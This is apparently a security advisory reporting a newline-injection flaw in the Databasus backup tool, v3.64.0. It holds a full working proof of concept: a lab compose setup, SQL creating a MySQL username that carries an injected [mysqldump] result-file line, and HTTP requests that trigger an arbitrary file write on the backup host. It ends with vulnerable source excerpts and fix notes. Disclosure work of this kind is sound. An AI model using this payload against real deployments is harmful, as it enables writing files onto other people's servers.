### Vulnerability details

**Official website / Product:** https://databasus.com/

**Repository:** https://github.com/databasus/databasus (stars at selection: 9220)

**Vulnerability type:** file_upload (arbitrary file write on backup host via my.cnf newline injection → mysqldump `result-file`)

**Vulnerability versions:** v3.64.0 (tag `v3.64.0`, commit `7efbe9e`)

**Vulnerability URL / Parameter:** Authenticated `POST /api/v1/databases/create` field `mysql.username` (and `mysql.host`) containing `\n`; trigger `POST /api/v1/backups` with `database_id` of that database

**Complex:** yes

### Verification procedure

Lab topology (shares `labs/databasus-r29-a5/` with sibling VULN-0048; if that directory is missing, rebuild from the compose below):

- Images: `databasus/databasus:v3.64.0` (image id `2c161762a655`, ~805MB) + `mysql:8.4.6` (`c7fa03bf950b`, ~785MB)
- Containers: `r29a5-databasus`, `r29a5-mysql`; network `r29a5-net`
- Ports: host **20905** → container **4005**; MySQL host **13306** → **3306**
- Credentials: workspace admin `admin@r29a5.local` / `AdminPass123!`
- Attacker MySQL username (exactly 32 bytes, MySQL max): `x\n[mysqldump]\nresult-file=/tmp/P`, password `pass`, database `appdb`

Reproducible compose:

```yaml
services:
  databasus:
    image: databasus/databasus:v3.64.0
    container_name: r29a5-databasus
    ports: ["20905:4005"]
    volumes: ["./data:/databasus-data"]
    networks: [r29a5-net]
  mysql:
    image: mysql:8.4.6
    container_name: r29a5-mysql
    environment:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_DATABASE: appdb
    ports: ["13306:3306"]
    networks: [r29a5-net]
networks:
  r29a5-net:
    name: r29a5-net
```

Example `docker ps` after bring-up (verified while healthy, ~18 minutes uptime):

```
NAMES             IMAGE                         PORTS                                                      STATUS
r29a5-databasus   databasus/databasus:v3.64.0   0.0.0.0:20905->4005/tcp, [::]:20905->4005/tcp              Up 18 minutes (healthy)
r29a5-mysql       mysql:8.4.6                   33060/tcp, 0.0.0.0:13306->3306/tcp, [::]:13306->3306/tcp   Up 18 minutes
```

1. `cd labs/databasus-r29-a5 && docker compose up -d`; wait until `r29a5-databasus` is healthy.
2. On the attacker-controlled MySQL (in-container or via `13306`) create the newline backup user (length exactly 32):

```sql
CREATE USER 'x
[mysqldump]
result-file=/tmp/P'@'%' IDENTIFIED BY 'pass';
GRANT SELECT, SHOW VIEW, TRIGGER, LOCK TABLES, EVENT, PROCESS ON *.* TO 'x
[mysqldump]
result-file=/tmp/P'@'%';
-- Seed dumpable data (lab used appdb / table t)
CREATE DATABASE IF NOT EXISTS appdb;
USE appdb;
CREATE TABLE IF NOT EXISTS t(id INT PRIMARY KEY, data TEXT);
INSERT IGNORE INTO t VALUES (1,'hello-r29a5-pwn');
```

3. Sign up / sign in as `admin@r29a5.local` / `AdminPass123!`. Create a workspace and LOCAL storage. Example:

```http
POST /api/v1/users/signup HTTP/1.1
Host: 127.0.0.1:20905
Content-Type: application/json
Accept: application/json

{"email":"admin@r29a5.local","password":"AdminPass123!","name":"admin"}
```

```http
POST /api/v1/users/signin HTTP/1.1
Host: 127.0.0.1:20905
Content-Type: application/json
Accept: application/json

{"email":"admin@r29a5.local","password":"AdminPass123!"}
```

Use the response JSON `token` as `Authorization: Bearer …` (the JWT in the PoC below is the lab capture — replace with a freshly issued token when replaying).

4. `POST /api/v1/databases/create` with `mysql.username` = the newline username, `mysql.host`=`r29a5-mysql`, `mysql.password`=`pass`, `mysql.database`=`appdb`, `mysql.port`=`3306`; enable LOCAL backup config for that database. Record the returned `database_id` (lab used `9ee67f51-63c3-4877-ad33-dedadeb2349c`).
5. Trigger backup with the admin Bearer (full message below): `POST /api/v1/backups` body `{"database_id":"9ee67f51-63c3-4877-ad33-dedadeb2349c"}`.
6. After the backup job finishes, confirm arbitrary file write inside the Databasus container:

```bash
docker exec r29a5-databasus ls -l /tmp/P
docker exec r29a5-databasus head -n 20 /tmp/P
```

Expected output (Docker-verified):

```
-rw-r--r-- 1 databasus databasus 2456 Nov  1 23:26 /tmp/P
----
-- MySQL dump 10.13  Distrib 8.4.11, for Linux (x86_64)
--
-- Host: r29a5-mysql    Database: appdb
-- ------------------------------------------------------
-- Server version	8.4.6

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structur
```

`/tmp/P` is owned by `databasus` and starts with a full mysqldump of `appdb`. Stored backup size is ~0.0 MB because dump stdout was redirected to the host file. Backup logs show both `--defaults-file=.../.my.cnf` (injected `[mysqldump] result-file=/tmp/P`) and CLI `--user=x\n[mysqldump]\nresult-file=/tmp/P` (full username for auth).

### Complete vulnerability PoC

Complete HTTP request (Docker-verified trigger that performs the file write):

```http
POST /api/v1/backups HTTP/1.1
Host: 127.0.0.1:20905
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIxMDg5MzU2MDUsImlhdCI6MTc5MzU3NTYwNSwicGFzc3dvcmRDcmVhdGlvblRpbWUiOjE3OTM1NzQ2MTEsInJvbGUiOiJBRE1JTiIsInN1YiI6ImJlYWQzODRmLTNhY2ItNGI3Ni05OTQyLWNmZGQ2M2VjYjJmYiJ9.YkZuoHWpQ1WF5lly1L11bBoqXQCrMxeN-Eoh_UjqxV4
Content-Type: application/json
Accept: application/json
User-Agent: curl/8.22.0
Content-Length: 54

{"database_id":"9ee67f51-63c3-4877-ad33-dedadeb2349c"}
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate, max-age=0
Content-Type: application/json; charset=utf-8
Expires: 0
Pragma: no-cache
X-Request-Id: b37c7437-5b35-4130-8d65-bbfbc179ed34
Date: Sun, 01 Nov 2026 23:26:45 GMT
Content-Length: 41

{"message":"backup started successfully"}
```

### Vulnerability analysis

`CreateMysqlBackupUsecase.createTempMyCnfFile` (and MariaDB / restore twins) builds:

```
[client]
user=%s
password="%s"
host=%s
port=%d
```

Only the password is passed through `EscapeMysqlPassword` (escapes `\` and `"`). **Username and host are interpolated raw.** A username containing newlines closes the `user=` line and injects a new `[mysqldump]` section, e.g. `result-file=/tmp/P` or `tab=/tmp/dir`.

During backup the app also appends CLI `--user=<username>` (`buildMysqldumpArgs`). That single argv keeps the full newline username for authentication against the attacker MySQL, while the forged my.cnf section still applies via `--defaults-file=`, writing the dump onto the Databasus filesystem as `databasus`.

PostgreSQL’s `EscapePgpassField` (`backend/internal/util/tools/postgresql.go`) already strips `\n`/`\r`, so this is an incomplete, MySQL-specific gap.

Trigger / sink source (full path and line numbers, tag `v3.64.0`):

```go
# File: backend/internal/features/backups/backups/usecases/logical/mysql/create_backup_uc.go
# Lines: 321-359
func (uc *CreateMysqlBackupUsecase) createTempMyCnfFile(
	myConfig *mysqltypes.MysqlDatabase,
	password string,
) (string, error) {
	// ...
	content := fmt.Sprintf(`[client]
user=%s
password="%s"
host=%s
port=%d
`, myConfig.Username, tools.EscapeMysqlPassword(password), myConfig.Host, myConfig.Port)
	// Username/Host are NOT escaped for newlines or option metacharacters
```

```go
# File: backend/internal/util/tools/mysql.go
# Lines: 132-137
func EscapeMysqlPassword(password string) string {
	password = strings.ReplaceAll(password, "\\", "\\\\")
	password = strings.ReplaceAll(password, "\"", "\\\"")
	return password
}
```

Identical sinks: MariaDB create/restore and MySQL restore `createTempMyCnfFile`.

### Fix notes

- Reject `\n`/`\r`/`\t` and `[` in MySQL/MariaDB username and host at API validation.
- Escape username/host for my.cnf (or write via a safe key=value API) the same way PostgreSQL strips newlines in `.pgpass`.
- Prefer passing credentials only via argv/env that cannot introduce new option groups; keep `--defaults-file` free of attacker-controlled multiline values.
